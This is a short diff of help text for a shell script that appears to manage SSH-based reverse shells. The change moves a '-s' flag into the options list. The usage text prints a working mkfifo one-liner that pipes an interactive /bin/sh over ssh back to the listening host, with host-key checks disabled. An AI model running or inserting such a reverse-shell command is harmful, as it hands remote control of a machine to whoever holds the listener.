@@ -6,16 +6,17 @@ HOSTNAME=$(hostname)
 
 usage() {
   cat <<- _EOM_
-Usage: $0 [OPTIONS] [-c [-s]|-a <SSH public key>|-r <SSH public key>]
+Usage: $0 [OPTIONS] [-c |-a <SSH public key>|-r <SSH public key>]
   -c                    Connect to the remote shell endpoint
-  -s                    Do not attempt to launch a full TTY when connecting to
-                        the remote endpoint
   -a <SSH public key>   Add <SSH public key> to authorized_keys
   -r <SSH public key>   Remove <SSH public key> from authorized_keys
   DEFAULT               Listen for incomming connections
 
   Options:
       -u <user>   The user under which to configure SSH keys DEFAULT 'rshell'
+      -s          Do not attempt to launch a full TTY when connecting to the
+                  remote endpoint
+
 
 Run the following command on the remote server to connect the reverse shell:
   mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file> -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" $USER@$HOSTNAME > /tmp/f; rm /tmp/f
